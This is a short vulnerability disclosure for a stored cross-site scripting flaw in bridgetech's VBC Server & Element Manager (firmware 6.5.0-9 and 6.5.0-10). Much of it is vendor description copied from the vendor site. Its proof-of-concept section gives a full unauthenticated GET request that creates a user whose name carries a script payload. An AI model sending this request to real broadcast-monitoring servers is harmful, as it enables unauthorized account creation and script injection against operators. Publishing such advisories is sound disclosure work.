# bridgetech VBC Server & Element Manager Stored cross-site scripting Vulnerability

## Too lazy to write details, so here’s the description of the device from the vendor’s website
---
## Description
The Bridge probes offered in the VBC are VB120, VB220, VB330, VB440, NOMAD, MDC and QTT Manager.

The VBC is structured around the concept of Sites, Users and Nodes. A Site is often a geographical location (Paris) or a logical network demarcation structure (Head-End-Ingest). A User is a user role defined by the admin user and could be anything. Users are given access to Sites. In this manner it is possible to deploy a single VBC instance and have multiple commercially independent entities accessing the same system. Nodes – or probes – are the physical monitoring points in the network and are organized underneath Sites.  

The VBC server may be accessed by several users simultaneously. An administrator manages users and their access rights, and a user can only view information concerning sites that he has access rights to. A user with read-only access can only view alarms whereas a user with read/write access can alter equipment settings at the sites he has access to. 
Centralized server software allowing unified monitoring of all deployed probes. Offers alarm aggregation, trend analysis (via microTimeline™), dashboards, Visio map integration, configuration management, user access control, reporting, and scaling from small to large deployments

Bridge Technologies is a Norwegian company based in Oslo that specializes in advanced monitoring, analysis, and quality assurance systems for digital media and telecommunications. Their solutions ensure high service quality across broadcast, cable, satellite, OTT, IPTV, and home networks, safeguarding content delivery for over 1.2 billion subscribers and thousands of channels worldwide
## Who Uses These Devices?

These solutions are primarily used by:

Broadcast and media companies (TV stations) operating studios,professional streamers, head-ends, and remote production environments.

Telecom, cable, satellite, and OTT providers ensuring service quality across networks.

Network engineers and QA teams needing real-time and historic insight into media delivery.

Remote production and field engineers deploying NOMAD in dynamic environments.

Large-scale operations managing many probes centrally via the VBC server.

---

## Vendor Information
- **Vendor:** bridgetech
- **Vendor Homepage:** [https://bridgetech.tv/](https://bridgetech.tv/)

---

## Affected Products
- **Product:** bridgetech VBC Server & Element Manager


- **Built Version:** Aug 12 2025 , Jul 1 2025 12:43:42
- **Firmware Version:**  6.5.0-10  , 6.5.0-9  

---

## Vulnerable Endpoints
- `/vbc/core/userSetupDoc/userSetupDoc`  


---

## Attack Type
- **Type:** Stored cross-site scripting  
- **Classification:** Improper Authorization  

---

## Impact
**Severity:** High  
---
## Attack Vector
- **Access Method:** Remote, over HTTP  
- **Authentication Requirement:** None (unauthenticated)  
- **Exploit Complexity:** Low (simple HTTP requests)  

---

## Proof of Concept (PoC)
make a get requste for his endpoints

{target}/vbc/core/userSetupDoc/userSetupDoc?UpdateFromDlg=1&addName=test2"<script>alert(1);</script>&addUsergroup=0&addStreamgroup=Default&addAutologin=false&addStream=true&addStack=false&addShowNum=true&addShowIface=false&addPass=test&submitflash=submit


---

